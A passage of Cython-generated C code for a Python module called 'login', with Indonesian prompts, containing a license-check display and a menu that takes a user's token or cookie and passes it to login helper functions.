  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_14, 13, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u_device_Alamat_IP);
  __pyx_t_7 += 32;
  __Pyx_GIVEREF(__pyx_kp_u_device_Alamat_IP);
  PyTuple_SET_ITEM(__pyx_t_14, 14, __pyx_kp_u_device_Alamat_IP);
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_IP); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_8 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) > __pyx_t_8) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_6) : __pyx_t_8;
  __pyx_t_7 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 15, __pyx_t_6);
  __pyx_t_6 = 0;
  __pyx_t_6 = __Pyx_PyUnicode_Join(__pyx_t_14, 16, __pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
  __pyx_t_14 = PyTuple_New(1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_14);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_14, 0, __pyx_t_6);
  __pyx_t_6 = 0;

  
  __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_title, __pyx_kp_u_bold_DATA_APIKEY) < 0) __PYX_ERR(0, 95, __pyx_L1_error)

  
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_14, __pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_9 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_AddTraceback("login.ceklisen", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_apikey);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_nama);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XDECREF(__pyx_v_status);
  __Pyx_XDECREF(__pyx_v_bergabung);
  __Pyx_XDECREF(__pyx_v_kadaluwarsa);
  __Pyx_XDECREF(__pyx_v_sisahari);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_5login_7login(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); 
static PyMethodDef __pyx_mdef_5login_7login = {"login", (PyCFunction)__pyx_pw_5login_7login, METH_NOARGS, 0};
static PyObject *__pyx_pw_5login_7login(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("login (wrapper)", 0);
  __pyx_r = __pyx_pf_5login_6login(__pyx_self);

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5login_6login(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_menu = NULL;
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_zz = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  Py_UCS4 __pyx_t_7;
  int __pyx_t_8;
  int __pyx_t_9;
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("login", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_logo); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 98, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ceklisen); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 99, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_prints); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Panel); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);

  
  __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 104, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_title, __pyx_kp_u_bold_MENU_LOGIN) < 0) __PYX_ERR(0, 104, __pyx_L1_error)

  
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__3, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_5);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 100, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(11); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_INCREF(__pyx_kp_u__4);
  __pyx_t_6 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__4);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__4);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_P); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u_Pilih);
  __pyx_t_6 += 10;
  __Pyx_GIVEREF(__pyx_kp_u_Pilih);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u_Pilih);
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_H); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_1);
  __pyx_t_6 += 2;
  __Pyx_GIVEREF(__pyx_kp_u_1);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_P); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u_Sampai);
  __pyx_t_6 += 7;
  __Pyx_GIVEREF(__pyx_kp_u_Sampai);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u_Sampai);
  __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_H); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_10);
  __pyx_t_6 += 2;
  __Pyx_GIVEREF(__pyx_kp_u_10);
  PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u_10);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_P); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_5);
  PyTuple_SET_ITEM(__pyx_t_1, 9, __pyx_t_5);
  __pyx_t_5 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_1, 10, __pyx_kp_u__5);
  __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_1, 11, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 105, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_menu = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_1 = __pyx_v_menu;
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_1_2, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 106, __pyx_L1_error)
  if (!__pyx_t_9) {
  } else {
    __pyx_t_8 = __pyx_t_9;
    goto __pyx_L4_bool_binop_done;
  }
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_01, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 106, __pyx_L1_error)
  __pyx_t_8 = __pyx_t_9;
  __pyx_L4_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_9 = (__pyx_t_8 != 0);
  if (__pyx_t_9) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_prints); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 107, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Panel); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 107, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 107, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_title, __pyx_n_u_INFO) < 0) __PYX_ERR(0, 107, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__6, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 107, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 107, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__7, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 108, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_v_token = __pyx_t_1;
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_get_token); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 109, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_3, __pyx_v_token) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_token);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 109, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_1 = __pyx_v_menu;
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_2, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 110, __pyx_L1_error)
  if (!__pyx_t_8) {
  } else {
    __pyx_t_9 = __pyx_t_8;
    goto __pyx_L6_bool_binop_done;
  }
  __pyx_t_8 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_02, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 110, __pyx_L1_error)
  __pyx_t_9 = __pyx_t_8;
  __pyx_L6_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_8 = (__pyx_t_9 != 0);
  if (__pyx_t_8) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_prints); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Panel); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_title, __pyx_n_u_INFO) < 0) __PYX_ERR(0, 111, __pyx_L1_error)
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__8, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 111, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__9, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 112, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_v_cookie = __pyx_t_1;
    __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_get_cookie); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 113, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_2, __pyx_v_cookie) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_cookie);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 113, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    goto __pyx_L3;
  }

  
  __Pyx_INCREF(__pyx_v_menu);
  __pyx_t_1 = __pyx_v_menu;
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_3, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 114, __pyx_L1_error)
  if (!__pyx_t_9) {
  } else {
    __pyx_t_8 = __pyx_t_9;
    goto __pyx_L8_bool_binop_done;
  }
  __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_03, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 114, __pyx_L1_error)
  __pyx_t_8 = __pyx_t_9;
  __pyx_L8_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_9 = (__pyx_t_8 != 0);
  if (__pyx_t_9) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_prints); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 115, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Panel); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 115, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 115, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_title, __pyx_n_u_INFO) < 0) __PYX_ERR(0, 115, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__10, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 115, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
